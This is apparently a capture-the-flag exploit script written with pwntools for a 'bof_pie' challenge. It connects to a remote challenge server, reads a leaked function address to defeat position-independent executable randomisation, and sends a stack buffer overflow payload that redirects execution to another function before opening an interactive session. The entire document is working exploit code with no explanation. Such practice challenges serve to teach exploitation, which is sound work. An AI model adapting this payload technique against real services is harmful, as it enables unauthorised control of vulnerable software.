from pwn import *

r = remote("ctf.j0n9hyun.xyz", 3008)
e = ELF("/Users/yee/Code/Python/bof_pie")

r.recvuntil('is ')
welcome = int(r.recv(10), 16)

b_j0n9hyun = 0x00000890

b_welcome = 0x00000909

offset = b_welcome - b_j0n9hyun

payload = b''
payload += b'A' * 0x16
payload += p32(welcome - offset)

r.sendline(payload)

r.interactive()